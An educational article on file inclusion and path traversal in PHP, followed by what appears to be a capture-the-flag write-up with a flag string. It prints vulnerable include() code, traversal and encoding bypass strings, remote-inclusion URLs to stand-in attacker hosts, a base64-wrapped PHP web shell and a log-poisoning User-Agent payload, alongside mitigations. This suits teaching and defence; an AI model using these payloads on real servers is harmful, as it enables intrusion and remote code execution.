File Inclusion and Path Traversal Vulnerabilities — A Detailed Breakdown

File Inclusion and Path Traversal vulnerabilities are common issues in web applications, where attackers can manipulate file paths or include unintended files, potentially leading to unauthorized access, information disclosure, or even Remote Code Execution (RCE). These vulnerabilities usually arise due to improper user input validation in file handling functionality.

1. File Inclusion Vulnerabilities (LFI and RFI)

File Inclusion vulnerabilities allow an attacker to include files in a web application, often via user input. These vulnerabilities fall into two broad categories:

Local File Inclusion (LFI)

What is LFI?
Local File Inclusion (LFI) occurs when an attacker is able to include files from the local file system into the application. This happens when the application allows user input to define which file to include or access without proper validation.

How it works:
LFI allows attackers to include sensitive files such as configuration files (/etc/passwd, /etc/shadow, or config.php) by manipulating the file path passed to the include() or require() functions in PHP.

Example:

<?php
$file = $_GET['file'];
include($file);
?>


If the attacker provides the input ?file=../../../../etc/passwd, the application will attempt to include /etc/passwd, allowing the attacker to view sensitive information about system users.

Escalating LFI to RCE:
LFI can be escalated to Remote Code Execution (RCE) if the attacker is able to upload a malicious file to the server, then include it using the LFI vulnerability. This may happen if the attacker can inject executable code into log files, session files, or even user-uploaded files.

Remote File Inclusion (RFI)

What is RFI?
Remote File Inclusion (RFI) occurs when an attacker can include files from a remote server by manipulating user input. It is possible if the application allows user-controlled URLs or file paths to be passed to PHP's include() or require() functions.

How it works:
In an RFI attack, an attacker controls a parameter, such as a URL or path, and can point the application to a remote file that could execute arbitrary PHP code. This happens in web applications that do not properly validate or sanitize user input.

Example:

<?php
$page = $_GET['page'];
include($page);
?>


An attacker could provide a URL as input like this: ?page=http://evil.com/malicious_file.php. This causes the server to include and execute the PHP file from the attacker’s server.

RFI to RCE:
If the attacker can control a PHP file hosted on a malicious server, they could potentially execute arbitrary code on the vulnerable server. For example, an attacker could craft a PHP payload that runs commands on the server.

2. Path Traversal Vulnerabilities

Path Traversal is another class of vulnerabilities where attackers can manipulate file paths to access files or directories that are outside the intended directory. This usually happens when an application fails to sanitize user input for file paths.

What is Path Traversal?

Path Traversal occurs when an application allows users to traverse directories using the ../ sequence (or variations of it) to access files and directories outside of the intended directory. This can lead to attackers reading sensitive files or potentially modifying files on the server.

How it works:
When a user provides input that is used to access files, and the application does not properly sanitize the input, the attacker can use directory traversal sequences like ../ to navigate up the directory structure and access restricted files.

Example:

<?php
$file = $_GET['file'];
include($file);
?>


If the attacker provides a path like ?file=../../../../etc/passwd, the application will attempt to include /etc/passwd, exposing sensitive information such as usernames and password hashes.

Variants of Path Traversal

Standard Path Traversal:
Attackers use ../ to navigate upward through the file system.

Example: ../../../../etc/passwd

Double Path Traversal:
Attackers may use ..// or multiple .. sequences to bypass filters that only check for ../.

Example: ..//..//..//etc//passwd

Encoded Path Traversal:
Path traversal strings (like ../) can be URL encoded to bypass detection by security filters.

Example: %2e%2e%2f (which decodes to ../)

Double Encoded Path Traversal:
Some applications decode input multiple times, so attackers may encode their payload twice to bypass security filters.

Example: %252e%252e%252f (which decodes to %2e%2e%2f and then to ../)

3. Obfuscation in File Inclusion and Path Traversal

Obfuscation is a common technique used by attackers to bypass input sanitization or security filters that prevent file inclusion or path traversal. Obfuscation allows attackers to hide their intent and evade simple checks.

Obfuscation Techniques

Extra Slashes in Path Traversal:
Using ..// instead of ../ to bypass basic filters that only check for ../.

Example: ..//..//..//etc/passwd

Overuse of ../:
Attackers can use multiple instances of ../ to break through filters that limit the number of ../ sequences.

Example: ..../..../..../..../etc/passwd

Dot Repetition (....//):
Using four dots to hide the traversal.

Example: ....//etc/passwd

Hexadecimal or Unicode Encoding:
Attackers can convert ../ into its hexadecimal equivalent %2e%2e%2f or Unicode equivalents to evade simple string matching filters.

Example: %2e%2e%2f%2e%2e%2f

URL Encoding:
Attackers encode the path traversal sequence (../) in URL encoding to bypass security mechanisms.

Example: %252e%252e%252f (double URL encoding)

Null Byte Injection:
In some cases, attackers can inject null bytes (%00) at the end of file names to truncate the file extension, bypassing filters that block specific file types.

Example: ../../etc/passwd%00.jpg

4. Exploiting File Inclusion and Path Traversal Vulnerabilities

To exploit File Inclusion and Path Traversal, attackers can perform the following:

For LFI:

Accessing Sensitive Files:
Attackers often target important system files such as:

/etc/passwd

/etc/shadow

/var/log/apache2/access.log

Injecting Malicious Code into Logs:
With LFI, attackers can inject malicious PHP code into server logs or session files. By including these logs using LFI, the code gets executed, leading to Remote Code Execution (RCE).

Example:
?page=/var/log/apache2/access.log

Arbitrary File Access:
Attackers can access sensitive configuration files or other user-uploaded files.

Example: ?page=../../../../etc/passwd

For RFI:

Including Remote Malicious Files:
If the application uses a URL as part of the include statement, an attacker can provide a URL pointing to a malicious server.

Example: ?page=http://attacker.com/malicious.php

Remote Code Execution:
By including malicious files from a remote server, attackers can execute arbitrary code on the server.

5. Mitigations for File Inclusion and Path Traversal

To prevent these vulnerabilities, web developers should follow best practices for input sanitization and file handling:

Input Validation:

Whitelist input: Only allow known and trusted file names, and avoid directly using user input to form file paths.

Sanitize and filter user input: Validate inputs to block ../, ..//, or URL-encoded characters.

Use of Absolute Paths:

Always use absolute paths for file inclusions and avoid relative paths that could be manipulated.

Disable Remote File Inclusion:

In PHP, disable allow_url_include and allow_url_fopen in php.ini to prevent RFI attacks.

Error Handling:

Disable detailed error messages in production, which may reveal sensitive information like file paths.

Limit File Permissions:

Restrict file and directory permissions to prevent unauthorized users from accessing or modifying sensitive files.

File Inclusion and Path Traversal Challenge

This challenge explores File Inclusion and Path Traversal vulnerabilities, with a specific focus on Local File Inclusion (LFI) and Remote File Inclusion (RFI) techniques. Participants will understand various exploitation methods, including PHP Wrappers, log poisoning, and obfuscation, all of which can lead to Remote Code Execution (RCE).

Table of Contents:

Introduction

Web Application Architecture

File Inclusion Types

PHP Wrappers

Base Directory Breakouts

LFI to RCE – Session Files

LFI to RCE – Log Poisoning

LFI to RCE – Wrappers

Conclusion

Key Takeaways

1. Introduction

File Inclusion and Path Traversal vulnerabilities occur when a web application improperly handles user-supplied input used in file paths.

When user input is passed directly into functions like:

include($_GET['page']);


An attacker may manipulate the file path to:

Access sensitive files (e.g., /etc/passwd)

Traverse outside the intended directory

Inject and execute malicious PHP code

These weaknesses can escalate into full Remote Code Execution (RCE) if not properly mitigated.

2. Web Application Architecture

Modern web applications typically consist of:

Frontend: Built using frameworks like React, Angular, or Vue.js. The frontend sends requests to the backend via APIs.

Backend: Built using PHP, Python, Node.js, etc. The backend processes requests, handles file operations, and interacts with databases.

The vulnerability appears when the backend dynamically includes files based on user input without proper validation.

Vulnerable Pattern:

include($_GET['page']);


If the page parameter is not sanitized, attackers can control what file gets included.

3. File Inclusion Types

Path Traversal allows attackers to navigate directories using ../ sequences to access files outside the intended folder.

Example: ?page=../../../../etc/passwd

Local File Inclusion (LFI) allows attackers to include files from the local server.

Impact: Reading configuration files, accessing system files, potential escalation to RCE.

Example: /var/www/html/?page=../../../../etc/passwd

Remote File Inclusion (RFI) allows attackers to include files hosted on remote servers.

Example: ?page=http://attacker.com/malicious_file.php

4. PHP Wrappers

PHP provides special stream wrappers that can manipulate data streams.
Common wrappers include php://filter, data://, and php://input.

Exploiting php://filter

The convert.base64-decode filter allows execution of Base64-encoded PHP payloads.

Example Payload:

<?php system($_GET['cmd']); echo 'Shell done!'; ?>


Base64 encoded:

PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+


Wrapper exploit:

php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+


When included, the server decodes and executes the resulting PHP code, allowing for command execution.

5. Base Directory Breakouts

Some applications try to restrict file inclusion to a specific directory. However, obfuscation techniques can bypass this:

Obfuscation Techniques:

Using ..//..// instead of ../../

Using ....// to disguise traversal

URL encoding: %2e%2e%2f

Double encoding: %252e%252e%252f

6. LFI to RCE – Session Files

PHP stores session data in files like:

/var/lib/php/sessions/sess_[sessionID]


If user input is stored in a session:

$_SESSION['page'] = $_GET['page'];
include($_GET['page']);


An attacker can inject PHP code into session data, locate their session file, include it via LFI, and execute the injected code.

Example:

?page=/var/lib/php/sessions/sess_[sessionID]


This converts LFI into full RCE.

7. LFI to RCE – Log Poisoning

Web servers log requests in files such as:

/var/log/apache2/access.log


An attacker can inject PHP code into logs via headers and include the log file:

User-Agent: <?php system($_GET['cmd']); ?>


Including the log file via LFI:

?page=/var/log/apache2/access.log


This causes the log file to execute as PHP, resulting in command execution.

8. LFI to RCE – Wrappers

Wrappers can be leveraged for RCE without needing file uploads, logs, or sessions. The following example shows the use of php://filter to execute malicious PHP code.

Flag:

FLAG{FILE_INCLUSION_VULNERABILITIES_SUCCESSFUL_EXPLOIT}

9. Conclusion

This challenge demonstrates how File Inclusion and Path Traversal vulnerabilities can escalate from simple file disclosure to full server compromise. Techniques covered include:

Path Traversal

Local File Inclusion (LFI)

Remote File Inclusion (RFI)

PHP Wrappers

Directory Breakouts

Session File Injection

Log Poisoning

Wrapper-based RCE

10. Key Takeaways

Never trust user-controlled file paths.

Always whitelist allowed files instead of blacklisting patterns.

Disable allow_url_include and allow_url_fopen in production.

Avoid dynamic includes using raw user input.

Obfuscation techniques can bypass naive filtering.

LFI combined with writable locations (logs, sessions) leads to RCE.

PHP wrappers significantly expand the attack surface.



